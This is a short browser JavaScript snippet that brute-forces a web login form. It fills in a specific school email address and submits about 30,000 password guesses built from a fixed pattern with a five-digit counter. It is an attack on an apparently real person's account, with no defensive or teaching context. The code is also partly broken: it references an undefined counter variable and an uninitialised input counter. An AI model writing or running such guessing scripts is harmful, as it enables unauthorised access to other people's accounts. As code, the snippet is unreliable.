let inputCounter;
let firstInput;
let secondInput;
for (const child of document.body.children) {
  if (child.tagName === 'INPUT' || child.tagName === 'TEXTAREA') {
    if (counter === 0) {
      firstInput = child
      inputCounter++
    } else {
      secondInput = child
    }
  } else if (child.tagName === "BUTTON") {
    submitButton = child;
  }
}

for (let i = 70000; i < 100000; i++) {
  if (firstInput) {
    firstInput.value = "26ponirosa@oceanschools.org"
  }
  if (secondInput) {
    secondInput.value = "OTISa" + format(i) + "p"
  }

  submitButton.dispatchEvent(new PointerEvent('click'))
}


function format(integer) {
  let value = "00000" + integer
  return value.slice(-5)
}
